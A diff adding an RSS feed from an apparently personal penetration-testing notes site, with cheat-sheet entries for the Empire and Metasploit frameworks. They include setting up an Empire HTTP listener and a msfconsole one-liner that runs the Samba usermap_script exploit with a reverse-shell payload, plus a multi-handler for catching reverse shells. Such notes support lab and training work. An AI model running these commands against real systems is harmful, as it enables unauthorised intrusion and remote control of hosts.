@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Frameworks on My notes and snippets</title><link>https://confident-austin-c176a7.netlify.com/tags/frameworks/</link><description>Recent content in Frameworks on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 11 Mar 2020 10:40:17 +0100</lastBuildDate><atom:link href="https://confident-austin-c176a7.netlify.com/tags/frameworks/index.xml" rel="self" type="application/rss+xml"/><item><title>empire</title><link>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/empire/</link><pubDate>Wed, 11 Mar 2020 10:40:17 +0100</pubDate><guid>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/empire/</guid><description>empire Install System git clone https://github.com/EmpireProject/Empire cd Empire sudo ./setup/install.sh Docker docker pull empireproject/empire Examples Reset DB /empire/setup/reset.sh setup basic listener and gen launcher (Empire) &amp;gt; listeners [!] No listeners currently active (Empire: listeners) &amp;gt; uselistener http (Empire: listeners/http) &amp;gt; set Host http://10.10.14.24:80 (Empire: listeners/http) &amp;gt; set BindIP 10.10.14.24 (Empire: listeners/http) &amp;gt; set Port 80 (Empire: listeners/http) &amp;gt; execute [*] Starting listener 'http' * Serving Flask app &amp;quot;http&amp;quot; (lazy loading) * Environment: production WARNING: This is a development server.</description></item><item><title>00-Frameworks</title><link>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/</guid><description>frameworks empire empire description.
+metasploit metasploit description.</description></item><item><title>metasploit</title><link>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/metasploit/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://confident-austin-c176a7.netlify.com/tools/00-frameworks/metasploit/</guid><description>metasploit Install Usage msfconsole
+Examples init database msfdb init
+create new workspace workspace -a [name]
+switch to workspace workspace [name]
+run commands without interactive shell msfconsole -x &amp;quot;use exploit/multi/samba/usermap_script;\
+set RHOST 172.16.194.172;\
+set PAYLOAD cmd/unix/reverse;\
+set LHOST 172.16.194.163;\
+run&amp;quot;
+Multi-handler for reverse shell use exploit/multi/handler
+set LHOST 192.168.88.128
+set LPORT 4444
+set ExitOnSession False
+netcat/bash reverse set PAYLOAD linux/x86/shell/reverse_tcp
+run in the background run -j
+Also see Github Project metasploit-unleashed</description></item></channel></rss>
